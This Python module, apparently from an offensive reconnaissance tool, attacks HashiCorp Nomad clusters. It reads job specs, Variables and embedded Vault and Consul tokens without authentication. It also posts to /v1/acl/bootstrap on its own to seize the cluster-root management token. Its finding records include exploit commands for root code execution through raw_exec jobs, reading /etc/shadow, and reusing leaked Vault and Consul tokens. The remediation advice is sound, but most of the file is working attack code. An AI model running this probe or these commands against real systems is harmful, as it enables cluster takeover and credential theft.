"""HashiCorp Nomad unauthenticated API probe.

Nomad (4646/tcp) runs scheduled workloads across a cluster. On a default
deployment without ACLs, the HTTP API reveals every job spec, task
allocation, secret template, and env variable — often including database
passwords, API keys, and TLS material embedded in the job files.

Probe walks:
  * /v1/agent/self       — fingerprint, version, ACL config
  * /v1/jobs             — every registered job (name, type, status)
  * /v1/allocations      — placements (client-node -> job mapping)
  * /v1/nodes            — cluster inventory

Findings:
  * nomad_unauth_read (CRITICAL) — ACL disabled or default-allow; the
    scheduler's entire state is readable, including secret material
    embedded in job specs.
  * nomad_authed (info) — reachable but token-gated; logged so any
    looted Nomad token has a known target endpoint.

Airgap-safe: stdlib http.client + ssl. Bounded (~4 endpoints * 3s).
"""
from __future__ import annotations

import http.client
import json
import ssl
from urllib.parse import quote

from ..core.models import Host, Port


_DEFAULT_PORT = 4646
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"
_VARS_MAX = 40
_JOB_SPEC_MAX = 10          # cap /v1/job/:id fetches — keeps probe bounded
_ENV_KEYS_MAX = 20          # per-task Env keys captured
_TMPL_MAX = 8               # per-job Template destinations captured
# Minimal valid HCL used to probe /v1/jobs/parse — parser-only, does NOT
# register a job. If the endpoint returns 200 for this on an anonymous
# request, the parser accepts submissions from unauthenticated clients.
_PARSE_PROBE_HCL = 'job "recce-probe" {}'


def is_nomad(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid in (4646, 4647, 4648)
            or "nomad" in svc or "nomad" in prod)


def _extract_token(creds: dict | None) -> str:
    """Pull a Nomad SecretID out of the shared creds dict. Recognises the
    top-level `nomad_token` / `token` keys and a nested `nomad` sub-dict
    (which is the shape the exploit-session-wiring subagent uses)."""
    if not isinstance(creds, dict):
        return ""
    for key in ("nomad_token", "token"):
        v = creds.get(key)
        if isinstance(v, str) and v:
            return v
    sub = creds.get("nomad")
    if isinstance(sub, dict):
        for key in ("token", "secret_id", "SecretID"):
            v = sub.get(key)
            if isinstance(v, str) and v:
                return v
    return ""


def _http(ip: str, port: int, method: str, path: str,
          timeout: float = _TIMEOUT, token: str = "",
          body: bytes | None = None,
          content_type: str = "") -> tuple[int, bytes] | None:
    """One request. Transparently retries HTTPS if plain HTTP is rejected."""
    headers = {"User-Agent": _UA, "Connection": "close"}
    if token:
        headers["X-Nomad-Token"] = token
    if body is not None and content_type:
        headers["Content-Type"] = content_type
    for use_tls in (False, True):
        conn = None
        try:
            if use_tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            return resp.status, resp.read(500_000)
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            if not use_tls:
                continue
            return None
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


def _extract_integration_tokens(config: dict) -> tuple[dict, dict]:
    """Pull Vault{Address,Token,Namespace} and Consul{Address,Token} from agent/self.config."""
    vault_out: dict = {}
    consul_out: dict = {}
    vault = config.get("Vault") or {}
    vtoken = str(vault.get("Token") or "")
    if vtoken:
        vault_out = {
            "address": str(vault.get("Address") or "")[:200],
            "token": vtoken[:120],
            "namespace": str(vault.get("Namespace") or "")[:80],
        }
    consul = config.get("Consul") or {}
    ctoken = str(consul.get("Token") or "")
    if ctoken:
        consul_out = {
            "address": str(consul.get("Address") or "")[:200],
            "token": ctoken[:120],
        }
    return vault_out, consul_out


def _try_acl_bootstrap(ip: str, port: int, timeout: float) -> str:
    """POST /v1/acl/bootstrap. Returns the SecretID iff the cluster was un-bootstrapped."""
    r = _http(ip, port, "POST", "/v1/acl/bootstrap", timeout=timeout)
    if r is None or r[0] != 200:
        return ""
    try:
        j = json.loads(r[1].decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return ""
    if not isinstance(j, dict):
        return ""
    return str(j.get("SecretID") or "")[:120]


def _enumerate_variables(ip: str, port: int, timeout: float,
                         token: str = "") -> list[dict]:
    """List /v1/vars and pull /v1/var/:path for each item (capped)."""
    r = _http(ip, port, "GET", "/v1/vars", timeout=timeout, token=token)
    if r is None or r[0] != 200:
        return []
    try:
        meta = json.loads(r[1].decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return []
    if not isinstance(meta, list):
        return []
    out: list[dict] = []
    for m in meta[:_VARS_MAX]:
        if not isinstance(m, dict):
            continue
        path = str(m.get("Path") or "")
        ns = str(m.get("Namespace") or "default")
        if not path:
            continue
        r2 = _http(ip, port, "GET",
                   f"/v1/var/{quote(path, safe='/')}?namespace={quote(ns, safe='')}",
                   timeout=timeout, token=token)
        entry: dict = {"path": path[:200], "namespace": ns[:60],
                       "keys": [], "values_readable": False}
        if r2 is not None and r2[0] == 200:
            try:
                v = json.loads(r2[1].decode("utf-8", "replace"))
                items = (v or {}).get("Items") or {}
                if isinstance(items, dict) and items:
                    entry["keys"] = [str(k)[:80] for k in list(items.keys())[:20]]
                    entry["values_readable"] = True
            except (ValueError, UnicodeDecodeError):
                pass
        out.append(entry)
    return out


def _fetch_job_spec(ip: str, port: int, timeout: float, job_id: str,
                    token: str = "") -> dict:
    """GET /v1/job/:job_id. Extract the fields that carry secret material:
    per-task Env keys, Template destinations, Vault{Policies,Namespace}
    references, and TaskGroup Meta keys. Returns {} if the fetch failed
    or was ACL-denied — the caller distinguishes 'no data' from 'no job'
    by list length."""
    if not job_id:
        return {}
    r = _http(ip, port, "GET", f"/v1/job/{quote(job_id, safe='')}",
              timeout=timeout, token=token)
    if r is None or r[0] != 200:
        return {}
    try:
        spec = json.loads(r[1].decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return {}
    if not isinstance(spec, dict):
        return {}
    env_keys: list[str] = []
    tmpl_dests: list[str] = []
    vault_refs: list[dict] = []
    meta_keys: list[str] = []
    groups = spec.get("TaskGroups") or []
    if isinstance(groups, list):
        for g in groups:
            if not isinstance(g, dict):
                continue
            gmeta = g.get("Meta") or {}
            if isinstance(gmeta, dict):
                meta_keys.extend(str(k)[:80] for k in list(gmeta.keys())[:10])
            tasks = g.get("Tasks") or []
            if not isinstance(tasks, list):
                continue
            for t in tasks:
                if not isinstance(t, dict):
                    continue
                env = t.get("Env") or {}
                if isinstance(env, dict):
                    env_keys.extend(str(k)[:80] for k in env.keys())
                tmpls = t.get("Templates") or []
                if isinstance(tmpls, list):
                    for tm in tmpls:
                        if isinstance(tm, dict):
                            dst = str(tm.get("DestPath") or "")
                            if dst:
                                tmpl_dests.append(dst[:200])
                v = t.get("Vault") or {}
                if isinstance(v, dict) and (v.get("Policies") or v.get("Namespace")):
                    pols = v.get("Policies") or []
                    if isinstance(pols, list):
                        vault_refs.append({
                            "policies": [str(p)[:60] for p in pols[:8]],
                            "namespace": str(v.get("Namespace") or "")[:80],
                        })
    # Cap after collection so ordering across task-groups is preserved.
    return {
        "id": job_id[:120],
        "env_keys": env_keys[:_ENV_KEYS_MAX],
        "template_dests": tmpl_dests[:_TMPL_MAX],
        "vault_refs": vault_refs[:5],
        "meta_keys": meta_keys[:_ENV_KEYS_MAX],
    }


def _probe_job_submit(ip: str, port: int, timeout: float,
                      token: str = "") -> str:
    """POST /v1/jobs/parse with a trivial HCL body. This is the parser-only
    endpoint and does NOT register a job. Result is one of:
      * "writable" — 200 OK: parser accepted the payload from this caller,
        so /v1/jobs is at minimum reachable and job registration is
        plausible (subject to a separate submit-job ACL check server-side).
      * "gated"    — 401/403: ACLs enforce on the parse endpoint.
      * ""         — unknown (5xx, unparseable, or transport error).
    """
    body = json.dumps({"JobHCL": _PARSE_PROBE_HCL,
                       "Canonicalize": True}).encode("utf-8")
    r = _http(ip, port, "POST", "/v1/jobs/parse", timeout=timeout,
              token=token, body=body, content_type="application/json")
    if r is None:
        return ""
    status = r[0]
    if status == 200:
        return "writable"
    if status in (401, 403):
        return "gated"
    return ""


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          token: str = "") -> dict:
    """Return {reachable, version, acl_enabled, jobs, allocations, nodes, ...}."""
    out: dict = {"reachable": False, "version": "", "acl_enabled": None,
                 "jobs": [], "allocations": 0, "nodes": 0, "leader": "",
                 "vault": {}, "consul": {}, "vars": [], "acl_bootstrap_token": "",
                 "job_specs": [], "job_submit": "",
                 # T2 evidence: compact server-returned proof line built from
                 # the same /v1/agent/self read the T1 fingerprint already
                 # performs — no additional wire traffic, no state change.
                 "acl_evidence": ""}

    r = _http(ip, port, "GET", "/v1/agent/self", timeout=timeout, token=token)
    if r is None:
        return out
    status, body = r
    if status != 200:
        # /v1/status/leader is anonymous even under ACL enforcement
        r2 = _http(ip, port, "GET", "/v1/status/leader", timeout=timeout, token=token)
        if r2 is None or r2[0] != 200:
            return out
        out["reachable"] = True
        out["leader"] = r2[1].decode("utf-8", "replace").strip().strip('"')[:80]
        out["acl_enabled"] = True
        # Reads gated -> attempt the one-shot bootstrap that only succeeds when
        # ACLs are enabled but never bootstrapped.
        if not token:
            out["acl_bootstrap_token"] = _try_acl_bootstrap(ip, port, timeout)
        return out
    out["reachable"] = True
    acl_subblob = ""
    try:
        j = json.loads(body.decode("utf-8", "replace"))
        config = j.get("config") or {}
        out["version"] = str(config.get("Version") or j.get("member", {}).get("Tags", {}).get("build") or "")[:60]
        acl = (config.get("ACL") or {}).get("Enabled")
        out["acl_enabled"] = bool(acl)
        vault_cfg, consul_cfg = _extract_integration_tokens(config)
        out["vault"] = vault_cfg
        out["consul"] = consul_cfg
        # Serialise the ACL sub-object exactly as the server sent it — the
        # T2 proof for nomad_unauth_read is that {"Enabled":false,...} came
        # off the wire, not that recce inferred it.
        acl_obj = config.get("ACL")
        if isinstance(acl_obj, dict):
            try:
                acl_subblob = json.dumps(acl_obj, sort_keys=True)[:240]
            except (TypeError, ValueError):
                acl_subblob = ""
    except (ValueError, UnicodeDecodeError):
        pass

    r = _http(ip, port, "GET", "/v1/jobs", timeout=timeout, token=token)
    if r is not None and r[0] == 200:
        try:
            jobs = json.loads(r[1].decode("utf-8", "replace"))
            if isinstance(jobs, list):
                out["jobs"] = [{"name": (j.get("Name") or j.get("ID") or "?"),
                                "type": j.get("Type", ""),
                                "status": j.get("Status", "")}
                               for j in jobs[:50]]
        except (ValueError, UnicodeDecodeError):
            pass

    r = _http(ip, port, "GET", "/v1/allocations", timeout=timeout, token=token)
    if r is not None and r[0] == 200:
        try:
            allocs = json.loads(r[1].decode("utf-8", "replace"))
            out["allocations"] = len(allocs) if isinstance(allocs, list) else 0
        except (ValueError, UnicodeDecodeError):
            pass

    r = _http(ip, port, "GET", "/v1/nodes", timeout=timeout, token=token)
    if r is not None and r[0] == 200:
        try:
            nodes = json.loads(r[1].decode("utf-8", "replace"))
            out["nodes"] = len(nodes) if isinstance(nodes, list) else 0
        except (ValueError, UnicodeDecodeError):
            pass

    out["vars"] = _enumerate_variables(ip, port, timeout, token=token)

    # Fetch per-job spec for the first N discovered jobs — where secret
    # material (Env/Templates/Vault refs) actually lives.
    specs: list[dict] = []
    for jrec in out["jobs"][:_JOB_SPEC_MAX]:
        jid = jrec.get("name") or ""
        s = _fetch_job_spec(ip, port, timeout, jid, token=token)
        if s:
            specs.append(s)
    out["job_specs"] = specs

    # One-shot write-access probe against the HCL parser endpoint. Kept
    # separate from the read-side status so a caller can distinguish
    # 'anonymous read' from 'anonymous read + writable API'.
    out["job_submit"] = _probe_job_submit(ip, port, timeout, token=token)

    # Build the T2 evidence line only when reads were actually anonymous
    # and ACLs were reported disabled — the server-side proof that the
    # T1 nomad_unauth_read finding is real, captured from the same
    # /v1/agent/self read the fingerprint already did (no extra traffic).
    if out["acl_enabled"] is False and not token:
        parts = ["GET /v1/agent/self -> 200"]
        if out["version"]:
            parts.append(f'config.Version="{out["version"]}"')
        if acl_subblob:
            parts.append(f"config.ACL={acl_subblob}")
        parts.append(
            f"anon reads: jobs={len(out['jobs'])} "
            f"allocations={out['allocations']} nodes={out['nodes']}")
        out["acl_evidence"] = " | ".join(parts)[:600]

    return out


def nomad_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_nomad(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "nomad", "command": cmd, "remediation": rem, "cwes": cwes,
            "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier,
            "output": output}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_nomad(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            unauth = bool(pr.get("jobs") or pr.get("allocations") or pr.get("nodes"))
            if unauth and not pr.get("acl_enabled"):
                job_names = [j["name"] for j in pr.get("jobs", [])]
                jobs_txt = ", ".join(job_names[:8]) or "-"
                out.append(_finding(
                    "critical",
                    "Nomad unauthenticated cluster read (ACLs disabled)", tgt,
                    f"Nomad {pr.get('version','?')} — ACLs disabled or unconfigured. "
                    f"Anonymous reads returned {len(pr.get('jobs',[]))} job(s), "
                    f"{pr.get('allocations',0)} allocation(s), {pr.get('nodes',0)} node(s). "
                    f"Jobs: {jobs_txt}"
                    + ("… (truncated)" if len(job_names) > 8 else "")
                    + ". Job specs commonly embed secret templates, env variables "
                    "with API keys, and DB connection strings.",
                    f"curl http://{h.ip}:{p.portid}/v1/jobs",
                    "Enable ACLs in the Nomad server config (acl { enabled = true }); "
                    "bind the API to a private interface; require SecretID tokens.",
                    ["CWE-306", "CWE-284", "CWE-200"], kind="nomad_unauth_read",
                    exploit_note=(
                        "curl -sX POST http://<ip>:4646/v1/jobs -d @rawexec-job.json "
                        "— with driver=raw_exec and command=/bin/id — runs as root "
                        "on a client node."),
                    # T2 promotion: the emitted finding now carries a wire
                    # evidence line captured off /v1/agent/self showing the
                    # ACL sub-config the server returned unauthenticated,
                    # plus the counts anon reads returned. No writes, no
                    # extra requests beyond the T1 fingerprint chain.
                    depth_tier="t2",
                    output=pr.get("acl_evidence") or ""))
            else:
                out.append(_finding(
                    "info", "Nomad endpoint reachable (ACL enforcing)", tgt,
                    f"Nomad {pr.get('version','?')} reachable — reads gated by ACL. "
                    f"Leader: {pr.get('leader','?')}. Any looted Nomad SecretID would "
                    f"target this endpoint.",
                    f"curl http://{h.ip}:{p.portid}/v1/status/leader",
                    "Ensure ACLs stay enforcing; rotate compromised tokens promptly.",
                    [], kind="nomad_authed",
                    exploit_note=(
                        "curl -sX POST http://<ip>:4646/v1/acl/bootstrap — if "
                        "200, cluster management token in response."),
                    depth_tier="t0"))

            if pr.get("acl_bootstrap_token"):
                sid = pr["acl_bootstrap_token"]
                shown = sid[:8] + "…" if len(sid) > 8 else sid
                out.append(_finding(
                    "critical",
                    "Nomad ACL system un-bootstrapped — cluster-root token obtained", tgt,
                    f"POST /v1/acl/bootstrap succeeded: ACLs were enabled but never "
                    f"initialized, so the API handed over the initial management "
                    f"SecretID (…{shown}). This token has cluster-god rights: read "
                    f"every job spec, submit jobs, exec into any allocation, read "
                    f"Variables, and rotate ACL policies.",
                    f"curl -sk -X POST http://{h.ip}:{p.portid}/v1/acl/bootstrap",
                    "Bootstrap ACLs immediately from a trusted host and store the "
                    "resulting management token in a secret manager; do not leave "
                    "acl.enabled=true on a fresh cluster unattended.",
                    ["CWE-306", "CWE-1188"], kind="nomad_acl_bootstrap_available",
                    exploit_note=(
                        "Use captured SecretID: X-Nomad-Token: <token> to POST a "
                        "raw_exec job that runs `id;hostname;cat /etc/shadow` on the "
                        "client — full node compromise."),
                    depth_tier="t3"))

            vault_cfg = pr.get("vault") or {}
            consul_cfg = pr.get("consul") or {}
            if vault_cfg.get("token") or consul_cfg.get("token"):
                parts = []
                if vault_cfg.get("token"):
                    vt = vault_cfg["token"]
                    parts.append(f"Vault token (…{vt[-6:]}) for {vault_cfg.get('address') or '?'}"
                                 + (f" ns={vault_cfg['namespace']}" if vault_cfg.get("namespace") else ""))
                if consul_cfg.get("token"):
                    ct = consul_cfg["token"]
                    parts.append(f"Consul token (…{ct[-6:]}) for {consul_cfg.get('address') or '?'}")
                out.append(_finding(
                    "critical",
                    "Nomad agent/self leaks Vault/Consul integration tokens", tgt,
                    f"Nomad {pr.get('version','?')} /v1/agent/self returned the "
                    f"cluster's integration credentials in cleartext: "
                    + "; ".join(parts) + ". These are the exact tokens Nomad uses "
                    "to talk to Vault and Consul on the operator's behalf — reusable "
                    "against those endpoints directly.",
                    f"curl -sk http://{h.ip}:{p.portid}/v1/agent/self | jq .config.Vault,.config.Consul",
                    "Do not embed static tokens in the Nomad agent config; use "
                    "Vault agent auto-auth / Consul auto-encrypt and gate /v1/agent/self "
                    "behind an ACL policy that requires management scope.",
                    ["CWE-522", "CWE-200"], kind="nomad_integration_token_leak",
                    exploit_note=(
                        "VAULT_ADDR=<leaked_addr> VAULT_TOKEN=<leaked_tok> vault kv "
                        "list secret/; CONSUL_HTTP_ADDR=<leaked_addr> "
                        "CONSUL_HTTP_TOKEN=<leaked_tok> consul kv get -recurse"),
                    depth_tier="t3"))

            job_specs = pr.get("job_specs") or []
            secretful = [s for s in job_specs
                         if s.get("env_keys") or s.get("template_dests")
                         or s.get("vault_refs")]
            if secretful:
                # Prefer showing env-key names — those are the highest-signal
                # tokens (e.g. AWS_SECRET_ACCESS_KEY, DB_PASSWORD).
                env_hits: list[str] = []
                for s in secretful:
                    for k in s.get("env_keys") or []:
                        env_hits.append(f"{s.get('id','?')}:{k}")
                        if len(env_hits) >= 12:
                            break
                    if len(env_hits) >= 12:
                        break
                tmpl_hits = [t for s in secretful for t in (s.get("template_dests") or [])][:6]
                vault_hits = sum(1 for s in secretful if s.get("vault_refs"))
                detail = (
                    f"GET /v1/job/:id returned full specs for {len(secretful)} "
                    f"job(s). Env keys observed (job:key): "
                    + (", ".join(env_hits) or "-")
                    + (f". Template destinations: {', '.join(tmpl_hits)}" if tmpl_hits else "")
                    + (f". {vault_hits} job(s) reference Vault policies." if vault_hits else "")
                    + " Env, Templates, and Vault policy references are where "
                    "operators embed DB URIs, API keys, and TLS material."
                )
                first_id = secretful[0].get("id") or "?"
                out.append(_finding(
                    "critical",
                    "Nomad job specs disclose task Env / Templates / Vault refs", tgt,
                    detail,
                    f"curl -sk http://{h.ip}:{p.portid}/v1/job/{first_id}",
                    "Move secret material out of job Env{} and Templates into "
                    "Vault (with Nomad's Vault integration) or Nomad Variables "
                    "with a scoped ACL; deny anonymous read on /v1/job/:id.",
                    ["CWE-200", "CWE-522", "CWE-798"],
                    kind="nomad_job_spec_secrets",
                    exploit_note=(
                        "curl -s http://<ip>:4646/v1/job/<id> | jq -r "
                        "'.TaskGroups[].Tasks[] | .Env' — env values in clear; curl "
                        "http://<ip>:4646/v1/client/fs/cat/<allocid>?path=secrets/env "
                        "— rendered template with real secrets."),
                    depth_tier="t1"))

            submit = pr.get("job_submit") or ""
            if submit == "writable":
                out.append(_finding(
                    "critical",
                    "Nomad HCL parse endpoint accepts anonymous submissions", tgt,
                    f"POST /v1/jobs/parse returned 200 for an anonymous, minimal "
                    f"HCL payload on Nomad {pr.get('version','?')}. The parser "
                    f"endpoint does not require a token, indicating the API is "
                    f"reachable for job-registration attempts. Where the exec / "
                    f"raw_exec / docker drivers are enabled on client nodes, an "
                    f"attacker who can PUT /v1/jobs runs arbitrary code on any "
                    f"eligible client (typically as root for raw_exec).",
                    f"curl -sk -X POST -H 'Content-Type: application/json' "
                    f"--data '{{\"JobHCL\":\"job \\\"x\\\" {{}}\","
                    f"\"Canonicalize\":true}}' "
                    f"http://{h.ip}:{p.portid}/v1/jobs/parse",
                    "Require an ACL token for /v1/jobs/parse and /v1/jobs; "
                    "disable the raw_exec driver on client nodes unless "
                    "explicitly needed; scope the submit-job capability to "
                    "operators only.",
                    ["CWE-306", "CWE-94", "CWE-78"],
                    kind="nomad_job_submit_rce",
                    exploit_note=(
                        "cat > job.json <<'EOF' {\"Job\":{\"ID\":\"pwn\",\"Type\":"
                        "\"batch\",\"Datacenters\":[\"dc1\"],\"TaskGroups\":[{\"Name"
                        "\":\"g\",\"Tasks\":[{\"Name\":\"t\",\"Driver\":\"raw_exec\","
                        "\"Config\":{\"command\":\"/bin/sh\",\"args\":[\"-c\","
                        "\"id>/tmp/pwn\"]}}]}]}} EOF; curl -X POST "
                        "http://<ip>:4646/v1/jobs -d @job.json"),
                    depth_tier="t1"))

            variables = pr.get("vars") or []
            readable = [v for v in variables if v.get("values_readable")]
            if variables:
                sample = ", ".join(v["path"] for v in variables[:6]) or "-"
                extra = "" if len(variables) <= 6 else f" (+{len(variables) - 6} more)"
                sev = "critical" if readable else "high"
                out.append(_finding(
                    sev,
                    "Nomad Variables secret store readable", tgt,
                    f"GET /v1/vars returned {len(variables)} variable path(s); "
                    f"{len(readable)} yielded cleartext Items on GET /v1/var/:path. "
                    f"Nomad Variables is the built-in secret store — DB URIs, cloud "
                    f"credentials, and template inputs typically live here. "
                    f"Paths: {sample}{extra}.",
                    f"curl -sk http://{h.ip}:{p.portid}/v1/vars",
                    "Scope the `anonymous` ACL policy to deny variables.read; grant "
                    "per-path variables policies only to the jobs that need them.",
                    ["CWE-200", "CWE-522"], kind="nomad_variables_readable",
                    exploit_note=(
                        "curl -s http://<ip>:4646/v1/vars | jq -r '.[].Path' | while "
                        "read p; do curl -s \"http://<ip>:4646/v1/var/$p\" | jq "
                        ".Items; done"),
                    depth_tier="t3"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Cluster fingerprint",
         "cmd": f"curl -sk http{{,s}}://{ip}:{port}/v1/agent/self"},
        {"step": "List jobs (contains secrets in specs)",
         "cmd": f"curl -sk http://{ip}:{port}/v1/jobs"},
        {"step": "Dump one job's full spec",
         "cmd": f"curl -sk http://{ip}:{port}/v1/job/<job-id>"},
    ]


def credentialed_runbook(ip: str, port: int) -> list[dict]:
    """Steps that assume a valid X-Nomad-Token is in hand."""
    return [
        {"step": "Validate the token",
         "cmd": f"curl -sk -H 'X-Nomad-Token: $TOKEN' "
                f"http://{ip}:{port}/v1/acl/token/self"},
        {"step": "List Nomad Variables (native secret store)",
         "cmd": f"curl -sk -H 'X-Nomad-Token: $TOKEN' "
                f"http://{ip}:{port}/v1/vars?namespace=*"},
        {"step": "Dump a job spec (Env / Templates / Vault refs)",
         "cmd": f"curl -sk -H 'X-Nomad-Token: $TOKEN' "
                f"http://{ip}:{port}/v1/job/<job-id>"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "nomad", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = nomad_targets(hosts)
    probes: dict = {}
    state: dict = {}
    tok = _extract_token(creds)
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"], token=tok),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                t["unauth"] = not pr.get("acl_enabled") and bool(
                    pr.get("jobs") or pr.get("allocations") or pr.get("nodes"))
    fs = findings(hosts, probes)
    cred_steps = credentialed_runbook if tok else (lambda ip, port: [])
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]),
                 "credentialed": cred_steps(t["ip"], t["port"])}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
